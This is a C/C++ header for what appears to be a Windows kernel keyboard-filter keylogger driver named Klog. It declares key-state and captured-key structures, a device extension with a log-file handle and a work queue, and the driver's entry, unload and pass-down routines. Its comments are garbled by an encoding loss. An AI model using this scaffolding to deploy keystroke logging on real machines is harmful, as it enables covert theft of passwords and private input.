#ifndef __Klog_h__
#define __Klog_h__

typedef BOOLEAN BOOL;

// STRUCTURES �ṹ��

struct KEY_STATE //����״̬
{
	bool kSHIFT; // shift���Ƿ񱻰���
	bool kCAPSLOCK; // CAPSLOCK�Ƿ񱻰���
	bool kCTRL; // Ctrl���Ƿ񱻰���
	bool kALT; // Alt���Ƿ񱻰���
};

struct KEY_DATA
{
	LIST_ENTRY ListEntry;
	char KeyData;
	char KeyFlags;
};

typedef struct _DEVICE_EXTENSION
{
	PDEVICE_OBJECT pKeyboardDevice; //ָ���豸ջ�е���һ������
	PETHREAD pThreadObj;			//�������̵�ָ��
	bool bThreadTerminate;		    // �߳��Ƿ���ֹ
	HANDLE hLogFile;				//�����ļ���¼���
	KEY_STATE kState;				//�Ƿ�������ⰴ��

	//����ɨ��ֵ��IRP��Ϣ�Ĺ����������źţ������������ӱ�Ŀ���
	KSEMAPHORE semQueue;
	KSPIN_LOCK lockQueue;
	LIST_ENTRY QueueListHead;
}DEVICE_EXTENSION, *PDEVICE_EXTENSION;

extern "C" NTSTATUS DriverEntry(IN PDRIVER_OBJECT  DriverObject, IN PUNICODE_STRING RegistryPath);
VOID Unload(IN PDRIVER_OBJECT DriverObject);
NTSTATUS DispatchPassDown(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp);

#endif			// __Klog_h__

